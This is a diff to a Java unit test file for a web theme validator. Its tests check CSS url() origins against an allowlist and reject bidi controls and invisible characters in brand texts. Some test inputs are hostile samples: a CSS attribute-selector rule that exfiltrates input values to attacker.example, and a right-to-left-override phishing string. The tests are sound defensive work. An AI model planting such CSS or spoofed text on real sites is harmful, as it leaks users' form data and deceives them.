@@ -182,9 +182,46 @@ class ThemeValidatorTest {
     }
 
     @Test
-    void customCss_mayReferenceTheThemesOwnHttpsAssetOrigins() {
-        final Theme t = Theme.EMPTY.withAssets(new ThemeAssets(null, null, null, "https://photos.example/hero.webp"))
-                .withCustomCss(".helix-brand { background-image: url(https://photos.example/hero2.webp) }");
-        assertThat(realm(t)).isEmpty();
+    void customCss_cannotFetchFromAnOriginTheAdminIntroducedAsAnAsset() {
+        // Review C2: a logo URL on the attacker's host must not make that host "allowlisted" for CSS url().
+        final Theme t = Theme.EMPTY.withAssets(new ThemeAssets("https://attacker.example/logo.png", null, null, null))
+                .withCustomCss("input[value^=a]{background:url(https://attacker.example/a)}");
+        assertThat(realm(t)).containsOnlyKeys("customCss");
+        final Theme below = ThemeMerger.merge(ThemeDefaults.THEME,
+                Theme.EMPTY.withAssets(new ThemeAssets(null, null, null, "https://attacker.example/hero.webp")));
+        assertThat(validator.validate("firm", ThemeValidator.Scope.REALM,
+                Theme.EMPTY.withCustomCss(".b{background:url(https://attacker.example/x)}"), below)).containsKey("customCss");
+    }
+
+    @Test
+    void customCss_mayUseTheOperatorAllowlist_andTheRealmsOwnUploadedAssets() {
+        assertThat(realm(Theme.EMPTY.withCustomCss(".b{background:url(https://img.monthfold.example/x.png)}"))).isEmpty();
+        assertThat(realm(Theme.EMPTY.withCustomCss(".b{background:url(/realms/firm/theme/assets/logo01.svg)}"))).isEmpty();
+        assertThat(realm(Theme.EMPTY.withCustomCss(".b{background:url(/realms/firm/theme/assets/nope.svg)}")))
+                .as("not uploaded").containsKey("customCss");
+    }
+
+    @Test
+    void imageOrigins_forImgSrc_includeTheThemesOwnImages_butTheCssAllowlistDoesNot() {
+        final Theme t = Theme.EMPTY.withAssets(new ThemeAssets("https://cdn.example/logo.svg", null, null, null));
+        assertThat(validator.imageOrigins(t)).contains("https://cdn.example", "https://img.monthfold.example");
+        assertThat(validator.cssUrlOrigins()).containsExactly("https://img.monthfold.example");
+    }
+
+    @ParameterizedTest
+    @ValueSource(strings = {"Sign in at \u202egro.live\u202c", "a\u202ab", "a\u202bb", "a\u202db", "a\u2066b",
+            "a\u2067b", "a\u2068b", "a\u2069b", "a\u200bb", "a\ufeffb", "a\u0000b", "a\u0007b", "a\u009bb",
+            "a\rb", "a\tb"})
+    void texts_rejectBidiControlsAndInvisibleCharacters(final String text) {
+        assertThat(realm(Theme.EMPTY.withTexts(new ThemeTexts(LocalizedText.of(text), null, null, null, null, null))))
+                .as(text).containsKey("texts.brandHeadline");
+        assertThat(realm(Theme.EMPTY.withTexts(new ThemeTexts(null, null, null, null, null,
+                LocalizedList.of(List.of(text)))))).as(text).containsKey("texts.brandBadges");
+    }
+
+    @Test
+    void texts_allowNewlinesAndOrdinaryUnicode() {
+        assertThat(realm(Theme.EMPTY.withTexts(new ThemeTexts(null, null, null,
+                LocalizedText.of("Welkom bij Café Ærø — 月報\nTot ziens"), null, null)))).isEmpty();
     }
 }
